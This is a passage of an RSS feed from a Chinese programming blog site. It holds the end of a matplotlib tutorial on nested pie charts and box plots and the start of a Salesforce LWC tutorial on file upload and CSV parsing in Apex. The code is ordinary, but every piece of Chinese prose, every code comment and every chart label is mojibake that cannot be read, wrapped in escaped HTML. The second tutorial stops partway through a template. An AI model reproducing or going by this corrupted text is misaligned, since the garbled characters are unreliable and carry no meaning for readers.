&lt;p&gt;å†…åµŒç¯å½¢é¥¼å›¾å¼ä½¿å¾—é¥¼å›¾ä¸ä»…å¯ä»¥å±•ç¤ºå•ä¸€æ•°æ®é›†çš„æ¯”ä¾‹æƒ…å†µï¼Œè¿˜å¯ä»¥å¯¹æ¯”å±•ç¤ºå¤šæ•°æ®é›†çš„åˆ†å¸ƒæƒ…å†µã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

development_language = ['Java', 'Python', 'C++', 'PHP', 'Scala']

weight1 = [40, 20, 30, 15, 15]
weight2 = [25, 35, 30, 12, 13]

colors = ['#FF6600', '#9966FF', '#663333', '#3399CC', '#666600']

wedges1, texts1, autotexts1 = plt.pie(
    weight1,
    autopct='%.1f%%',
    radius=1,
    pctdistance=0.85,
    colors=colors,
    textprops=dict(color='w'),
    wedgeprops=dict(width=0.3, edgecolor='w')
)

&quot;&quot;&quot;
é¥¼å›¾çš„åˆ›å»ºå…¶å®æ˜¯æœ‰ä¸‰ä¸ªè¿”å›å€¼çš„ï¼š
1 ä¸€ä¸ªåºåˆ—ï¼Œmatplotlib.patches.Wedgeçš„å®ä¾‹
2 ä¸€ä¸ªåˆ—è¡¨ï¼Œmatplotlib.text.Textçš„å®ä¾‹ï¼Œæ˜¯labelçš„åˆ—è¡¨
3 ä¸€ä¸ªåˆ—è¡¨ï¼Œmatplotlib.text.Textçš„å®ä¾‹ï¼Œæ˜¯æ•°å€¼çš„æ–‡æœ¬å®ä¾‹æ ‡ç­¾ï¼Œåªæœ‰åœ¨å‚æ•°autopctä¸ä¸ºç©ºçš„æ—¶å€™æ‰æœ‰æ•ˆ
&quot;&quot;&quot;
print(wedges1)
print(texts1)
print(autotexts1)

wedges2, texts2, autotexts2 = plt.pie(
    weight2,
    autopct='%.1f%%',
    radius=0.75,
    pctdistance=0.75,
    colors=colors,
    textprops=dict(color='w'),
    wedgeprops=dict(width=0.5, edgecolor='b')  # è¾¹æ¡†
)

plt.legend(
    weight1,
    development_language,
    fontsize=5,
    title='å¼€å‘è¯­è¨€å æ¯”',
    loc='center left',
    bbox_to_anchor=(0.91, 0, 0.3, 1)
)

# è°ƒæ•´é¥¼å›¾å¤–åœˆä¸­çš„å­—ä½“
plt.setp(autotexts1, size=10, weight='bold')

# è°ƒæ•´é¥¼å›¾å†…åœˆä¸­çš„å­—ä½“
plt.setp(autotexts2, size=15, weight='bold')

plt.title('å¼€å‘è¯­è¨€ä½¿ç”¨äººæ•°æ¯”ä¾‹è¡¨')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601378280688-1150254a-2860-46ac-a0c3-427f7deda9da.png#align=left&amp;amp;display=inline&amp;amp;height=419&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=838&amp;amp;originWidth=1130&amp;amp;size=159030&amp;amp;status=done&amp;amp;style=none&amp;amp;width=565&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;ç»¼ä¸Šä»£ç ï¼Œå…¶å®ï¼Œé¥¼å›¾çš„åµŒå¥—ï¼Œå°±æ˜¯ç”»ä¸¤ä¸ªé¥¼å›¾ï¼Œä¸è¦è®©ä»–ä»¬é‡å ã€‚&lt;/p&gt;
&lt;h4 id=&quot;5-ç®±å‹å›¾&quot;&gt;5 ç®±å‹å›¾&lt;/h4&gt;
&lt;p&gt;ç®±å‹å›¾ä¸»è¦åº”ç”¨åœ¨ä¸€ç³»åˆ—æµ‹é‡æˆ–è€…æ¯”è¾ƒæ•°æ®çš„è§‚æµ‹ä¸­ï¼Œæ¯”å¦‚å­¦æ ¡ä¸å­¦æ ¡ä¹‹é—´æˆ–è€…ç­çº§ä¸ç­çº§ä¹‹é—´çš„æˆç»©æ¯”è¾ƒï¼Œå„ä¸ªè¿åŠ¨å‘˜ä¹‹é—´çš„ä½“èƒ½æ¯”è¾ƒï¼Œäº§å“ä¼˜åŒ–å‰å’Œäº§å“ä¼˜åŒ–åçš„å„é¡¹æ•°æ®æŒ‡æ ‡å±•ç°çš„ç»“æœæ¯”è¾ƒç­‰ç­‰ï¼Œç®±å‹å›¾æ˜¯æ•°æ®åˆ†æåœºæ™¯åº”ç”¨çš„æ¯”è¾ƒå¤šçš„ä¸€ç§æ•°æ®å¯è§†åŒ–å›¾å½¢ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# ç”Ÿæˆæ­£æ€åˆ†å¸ƒæ•°æ®
test1 = np.random.randn(5000)
test2 = np.random.randn(5000)

test_list = [test1, test2]

labels = ['éšæœºæ•°ç”Ÿæˆ1', 'éšæœºæ•°ç”Ÿæˆ2']

colors = ['#3399FF', '#CCCCFF']

box_plot = plt.boxplot(
    test_list,
    whis=1.5,  # ä¸Šä¸‹å››åˆ†ä½è·ç¦»
    widths=0.6,
    sym='o',
    labels=labels,
    patch_artist=True,  # æ˜¯å¦ç»™ç®±ä½“æ·»åŠ é¢œè‰²
    notch=True  # æ˜¯å¦ä¸­é—´vå‹å‡¹é™·
)

for patch, color in zip(box_plot['boxes'], colors):
    patch.set_facecolor(color)


plt.ylabel('éšæœºæ•°å€¼')
plt.title('ç”Ÿæˆå™¨æŠ—å¹²æ‰°èƒ½åŠ›çš„ç¨³å®šæ€§æ¯”è¾ƒ')

plt.grid(axis='y', ls=':', lw=1, color='gray', alpha=0.2)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601397506272-30b34c7b-3475-4361-9e5f-503e3c52880b.png#align=left&amp;amp;display=inline&amp;amp;height=453&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=906&amp;amp;originWidth=1206&amp;amp;size=101946&amp;amp;status=done&amp;amp;style=none&amp;amp;width=603&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;ä»¥ä¸Šæ˜¯æˆ‘ä»¬ç»˜åˆ¶çš„ä¸€äº›å¸¸ç”¨çš„å›¾å½¢å’Œä¸€äº›å¸¸ç”¨çš„å‚æ•°ï¼Œå½“ç„¶Matplotlibç»˜åˆ¶å›¾å½¢çš„èƒ½åŠ›è¿œä¸æ­¢äºæ­¤ï¼Œä½†å¦‚æœæ¯ä¸€ä¸ªå›¾å½¢éƒ½ä¸€ä¸€è®²ä¸€éçš„è¯ï¼Œé‚£ä¹ˆå†…å®¹ä¼šå…¨éƒ¨éƒ½ç”±ç”»å›¾æ¥ç»„æˆäº†ã€‚ç”»å›¾çš„é‡ç‚¹æ˜¯è¦å­¦ä¹ ç”»å›¾çš„æ€æƒ³ï¼Œé‡åˆ°é—®é¢˜å…ˆä¸è¦æ€¥äºå»ç”»ï¼Œé¦–å…ˆä¸€å®šè¦é€‰å®šä¸€ä¸ªåˆé€‚çš„å›¾å½¢ï¼Œç„¶åå†åŠ¨æ‰‹ã€‚æœ€æ ¸å¿ƒçš„å›¾å½¢æ— éå°±æ˜¯é‚£å‡ ä¸ªå¸¸ç”¨çš„ï¼Œæˆ‘ä»¬éƒ½å·²ç»è¿›è¡Œè¿‡äº†å¤šæ¬¡çš„ç»ƒä¹ ã€‚ç”»å›¾æ˜¯æ•°æ®åˆ†æã€æ•°æ®æŒ–æ˜ã€AIæ–¹å‘çš„ç®—æ³•å·¥ç¨‹å¸ˆå¿…å¤‡çš„æŠ€èƒ½ï¼Œæ‰€ä»¥ä¸€å®šè¦å¤šå¤šçš„ç»ƒä¹ å®ƒä»¬çš„ç»˜åˆ¶ã€‚æˆ‘ä»¬è¿˜ä¼šåœ¨åç»­çš„ç« èŠ‚ä¸­ä¸æ–­çš„å»ä½¿ç”¨è¿™äº›å›¾å½¢çš„ç»ƒä¹ ã€‚&lt;/p&gt;&lt;p&gt;æœ€åä¼šæœ‰ä¸€ä¸ªå°ç»ƒä¹ ï¼Œè¯·ç‚¹å‡»ä¸‹æ–¹é“¾æ¥ä¸‹è½½é¢˜ç›®å’Œæ•°æ®ï¼š&lt;br/&gt;&lt;a href=&quot;https://www.yuque.com/attachments/yuque/0/2020/zip/281865/1601397919398-0586cc42-2464-48d2-aafd-345531f7c8df.zip?_lake_card=%7B%22uid%22%3A%221601397917739-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F281865%2F1601397919398-0586cc42-2464-48d2-aafd-345531f7c8df.zip%22%2C%22name%22%3A%22chapter8-1.zip%22%2C%22size%22%3A5582276%2C%22type%22%3A%22application%2Fzip%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22xFoz4%22%2C%22card%22%3A%22file%22%7D&quot;&gt;chapter8-1.zip&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 16:51:00 +0000</pubDate>
<dc:creator>é©¬ä¸€ç‰¹</dc:creator>
<og:description>ä¸€ å›¾çš„åŸºæœ¬æ„æˆ Matplotlibæ˜¯æ•°æ®å¯è§†åŒ–å·¥ä½œä¸­ï¼Œæœ€å¸¸ç”¨çš„ä¸€ä¸ªå¯è§†åŒ–åº“ã€‚Matplotlibæœ‰éå¸¸å¤šçš„å›¾å½¢ï¼Œæˆ‘ä»¬å¾ˆéš¾åœ¨çŸ­æ—¶é—´å†…å°†å…¶æŒæ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦æŒæ¡çš„æ˜¯ç”»å›¾çš„æ€è·¯å’Œå¸¸ç”¨çš„ä¸€äº›å›¾å½¢ã€‚åˆ›å»ºä¸€</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mayite/p/13752591.html</dc:identifier>
</item>
<item>
<title>Salesforce LWCå­¦ä¹ (äºŒåä¸ƒ) File Upload - zero.zhang</title>
<link>http://www.cnblogs.com/zero-zyq/p/13749103.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zero-zyq/p/13749103.html</guid>
<description>&lt;p&gt;æœ¬ç¯‡å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.salesforce.com/docs/component-library/bundle/lightning-file-upload/documentation&quot; target=&quot;_blank&quot;&gt;https://developer.salesforce.com/docs/component-library/bundle/lightning-file-upload/documentation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.salesforce.com/docs/component-library/bundle/lightning-input/specification&quot; target=&quot;_blank&quot;&gt;https://developer.salesforce.com/docs/component-library/bundle/lightning-input/specification&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åœ¨salesforceä¸­ï¼Œä¸Šä¼ é™„ä»¶æ˜¯ä¸€ä¸ªç»å¸¸åšçš„æ“ä½œï¼Œåœ¨æ ‡å‡†çš„åŠŸèƒ½åŸºç¡€ä¸Šï¼Œlwcè‡ªç„¶ä¹Ÿå°è£…äº†è‡ªå®šä¹‰çš„å®ç°ã€‚æˆ‘ä»¬æœ‰ä¸Šä¼ æ–‡æ¡£éœ€æ±‚çš„æ—¶å€™ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹çš„å‡ ç‚¹éœ€æ±‚å’Œè€ƒè™‘ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;æ˜¯å¦æ”¯æŒå¤šæ–‡ä»¶ä¸Šä¼ &lt;/li&gt;
&lt;li&gt;æ˜¯å¦æ”¯æŒå¤§æ–‡ä»¶ä¸Šä¼ &lt;/li&gt;
&lt;li&gt;æ˜¯å¦å¯ä»¥é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹&lt;/li&gt;
&lt;li&gt;æ˜¯å¦å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œè§£æ(ç›®å‰demoä¸­ä»…é™csv)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;æ ¹æ®ä¸Šè¿°çš„å‡ ç‚¹éœ€æ±‚å’Œè€ƒè™‘ï¼Œæœ¬ç¯‡é‡‡ç”¨ä¸¤ç§æ–¹å¼æ¥å®ç°æ–‡ä»¶ä¸Šä¼ æ“ä½œæ¥å¥‘åˆè¿™äº›è¦æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¸€.Â lightning-file-uploadå®ç°å¤§æ–‡ä»¶ä¸Šä¼ &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ­¤ç§æ–¹å¼çš„ä¼˜ç¼ºç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;ä¼˜ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;æ”¯æŒå¤§æ–‡ä»¶ä¸Šä¼ ï¼›&lt;/li&gt;
&lt;li&gt;å¯ä»¥é™åˆ¶ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼›&lt;/li&gt;
&lt;li&gt;æ”¯æŒå¤šæ–‡ä»¶ä¸Šä¼ ï¼›&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;ç¼ºç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ä¸æ”¯æŒæ–‡ä»¶è§£æã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;demoå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;fileUploadSample.htmlï¼šä¸Šé¢çš„é“¾æ¥ä¸­ç»™å‡ºäº† lightning-file-uploadçš„ä½¿ç”¨æ–¹æ³•ï¼Œé€šè¿‡è®¾ç½® labelå±•ç¤ºä¸Šä¼ ç»„ä»¶çš„labelåç§°ï¼Œrecord-idç”¨æ¥æŒ‡å®šå½“å‰ä¸Šä¼ çš„è¿™äº›æ–‡ä»¶å°†ä½œä¸º note &amp;amp; Attachmentç»‘å®šåœ¨å“ªæ¡æ•°æ®ä¸‹ï¼ŒacceptæŒ‡å®šäº†é™åˆ¶çš„æ ¼å¼ï¼Œ uploadfinishedæ˜¯ç»„ä»¶è‡ªèº«å°è£…çš„äº‹ä»¶ï¼Œç”¨äºä¸Šä¼ å®Œæˆä¹‹åæ‰§è¡Œçš„äº‹ä»¶ï¼Œmultipleè®¾ç½® true/falseæ¥æŒ‡å®šå½“å‰çš„ç»„ä»¶æ˜¯å¦æ”¯æŒå¤šä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-card &lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;=&quot;File Upload&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-file-upload
            &lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;=&quot;ä¸Šä¼ é™„ä»¶&quot;&lt;/span&gt;&lt;span&gt;
            name&lt;/span&gt;&lt;span&gt;=&quot;fileUploader&quot;&lt;/span&gt;&lt;span&gt;
            accept&lt;/span&gt;&lt;span&gt;={acceptedFormats}
            &lt;/span&gt;&lt;span&gt;record-id&lt;/span&gt;&lt;span&gt;={recordId}
            &lt;/span&gt;&lt;span&gt;onuploadfinished&lt;/span&gt;&lt;span&gt;={handleUploadFinishedEvent}
            &lt;/span&gt;&lt;span&gt;multiple&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-file-upload&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-card&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;fileUploadSample.jsï¼šæ–¹æ³•ç”¨æ¥æŒ‡å®šå½“å‰åªæ¥å—csvï¼Œä¸Šä¼ æˆåŠŸä»¥åtoastä¿¡æ¯å±•ç¤ºç›¸å…³çš„ä¸Šä¼ æ–‡ä»¶åç§°ã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
import { LightningElement, api } from 'lwc'&lt;span&gt;;
import {ShowToastEvent} from &lt;/span&gt;'lightning/platformShowToastEvent'&lt;span&gt;;
export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt; class FileUploadSample extends LightningElement {
    @api recordId;

    get acceptedFormats() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ['.csv'&lt;span&gt;];
    }
    handleUploadFinishedEvent(event) {
        const uploadedFiles &lt;/span&gt;=&lt;span&gt; event.detail.files;
        let uploadedFilesName &lt;/span&gt;= uploadedFiles.map(element =&amp;gt;&lt;span&gt; element.name);
        let uploadedFileNamesStr &lt;/span&gt;= uploadedFilesName.join(','&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.dispatchEvent(
            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ShowToastEvent({
                title: &lt;/span&gt;'Success'&lt;span&gt;,
                message: uploadedFiles.length &lt;/span&gt;+ ' Files uploaded Successfully: ' +&lt;span&gt; uploadedFileNamesStr,
                variant: &lt;/span&gt;'success'&lt;span&gt;,
            }),
        );
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;ç»“æœå±•ç¤ºï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. é¡µé¢åˆå§‹åŒ–æ ·å­&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929124822240-1209223514.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â 2. ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶çš„UIæ•ˆæœï¼Œç‚¹å‡»doneå³è°ƒç”¨Â onuploadfinishedè¿™ä¸ªå¯¹åº”çš„handler&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929124946253-943227417.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â 3. å±•ç¤ºtoastæ¶ˆæ¯&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929125010915-1517314010.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â 4. ä¸Šä¼ çš„æ–‡ä»¶æ­£å¸¸çš„æŒ‚åˆ°äº† Notes &amp;amp; Attachmentä¸Šé¢&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929125132523-972842181.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â &lt;strong&gt;äºŒ. lightning-input å®ç°csvæ–‡ä»¶ä¸Šä¼ ä»¥åŠè§£æ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ­¤ç§æ–¹æ³•ä¼˜ç‚¹&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;æ”¯æŒä¸Šä¼ æ–‡ä»¶è§£æ&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;æ­¤ç§æ–¹æ³•ç¼ºç‚¹&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;å¯¹æ–‡ä»¶ä¸Šä¼ å¤§å°æœ‰ä¸¥æ ¼é™åˆ¶&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;demoå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;Â FileUploadUsingInputControllerï¼šç”¨äºå­˜å‚¨æ–‡ä»¶ä»¥åŠå¯¹csvå†…å®¹è¿›è¡Œè§£æï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“å‰æ–¹æ³•åªé’ˆå¯¹å•ä¸ªcsvçš„å•ä¸ªsheeté¡µè¿›è¡Œè§£æã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; with sharing &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FileUploadUsingInputController {
    @AuraEnabled
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; String saveFile(Id recordId, String fileName, String base64Data) {
        base64Data &lt;/span&gt;= EncodingUtil.urlDecode(base64Data, 'UTF-8'&lt;span&gt;);
        Blob contentBlob &lt;/span&gt;=&lt;span&gt; EncodingUtil.base64Decode(base64Data);
        String content &lt;/span&gt;= bitToString(contentBlob, 'UTF-8'&lt;span&gt;);
        content &lt;/span&gt;= content.replaceAll('\r\n', '\n'&lt;span&gt;);
        content &lt;/span&gt;= content.replaceAll('\r', '\n'&lt;span&gt;);
        String[] fileLines &lt;/span&gt;= content.split('\n'&lt;span&gt;);
        System.debug(&lt;/span&gt;'*** ' +&lt;span&gt; JSON.serialize(fileLines));
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(Integer i = 1; i &amp;lt; fileLines.size(); i++&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;TODO éå†æ“ä½œ&lt;/span&gt;
            system.debug('execute'&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; inserting file&lt;/span&gt;
        ContentVersion cv = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ContentVersion();
        cv.Title &lt;/span&gt;=&lt;span&gt; fileName;
        cv.PathOnClient &lt;/span&gt;= '/' +&lt;span&gt; fileName;
        cv.FirstPublishLocationId &lt;/span&gt;=&lt;span&gt; recordId;
        cv.VersionData &lt;/span&gt;=&lt;span&gt; EncodingUtil.base64Decode(base64Data);
        cv.IsMajorVersion &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        Insert cv;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 'successfully'&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; String bitToString(Blob input, String inCharset){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;è½¬æ¢æˆ16è¿›åˆ¶&lt;/span&gt;
        String hex =&lt;span&gt; EncodingUtil.convertToHex(input);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ä¸€ä¸ªStringç±»å‹ä¸¤ä¸ªå­—èŠ‚ 32ä½ï¼ˆbitï¼‰,åˆ™ä¸€ä¸ªStringé•¿åº¦åº”è¯¥ä¸ºä¸¤ä¸ª16è¿›åˆ¶çš„é•¿åº¦ï¼Œæ‰€ä»¥æ­¤å¤„å‘å³å¹³ç§»ä¸€ä¸ªå•ä½ï¼Œå³é™¤ä»¥2
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;å‘å³å¹³ç§»ä¸€ä¸ªå•ä½åœ¨æ­£æ•°æƒ…å†µä¸‹ç­‰åŒäºé™¤ä»¥2ï¼Œè´Ÿæ•°æƒ…å†µä¸‹ä¸ç­‰
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;eg 9  00001001  &amp;gt;&amp;gt;1 00000100   ç»“æœä¸º4&lt;/span&gt;
        &lt;span&gt;final&lt;/span&gt; Integer bytesCount = hex.length() &amp;gt;&amp;gt; 1&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;å£°æ˜Stringæ•°ç»„ï¼Œé•¿åº¦ä¸º16è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²çš„é•¿åº¦&lt;/span&gt;
        String[] bytes = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; String[bytesCount];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(Integer i = 0; i &amp;lt; bytesCount; ++&lt;span&gt;i) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;å°†ç›¸é‚»ä¸¤ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²æ”¾åœ¨ä¸€ä¸ªStringä¸­&lt;/span&gt;
            bytes[i] =  hex.mid(i &amp;lt;&amp;lt; 1, 2&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;è§£ç æˆæŒ‡å®šcharsetçš„å­—ç¬¦ä¸²&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt; EncodingUtil.urlDecode('%' + String.join(bytes, '%'&lt;span&gt;), inCharset);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;fileUploadUsingInput.html:å±•ç¤ºä¸Šä¼ ç»„ä»¶ä»¥åŠbutton&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-card &lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;=&quot;File Upload Using Input&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-layout &lt;/span&gt;&lt;span&gt;multiple-rows&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-layout-item &lt;/span&gt;&lt;span&gt;size&lt;/span&gt;&lt;span&gt;=&quot;12&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-input &lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;file uploader&quot;&lt;/span&gt;&lt;span&gt; onchange&lt;/span&gt;&lt;span&gt;={handleFilesChange} &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;file&quot;&lt;/span&gt;&lt;span&gt; accept&lt;/span&gt;&lt;span&gt;={acceptedType}&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-input&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;slds-text-body_small&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;{fileName}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-layout-item&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-layout-item&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-button &lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;={UploadFile} &lt;/span&gt;&lt;span&gt;onclick&lt;/span&gt;&lt;span&gt;={handleSave} &lt;/span&gt;&lt;span&gt;variant&lt;/span&gt;&lt;span&gt;=&quot;brand&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-button&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-layout-item&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
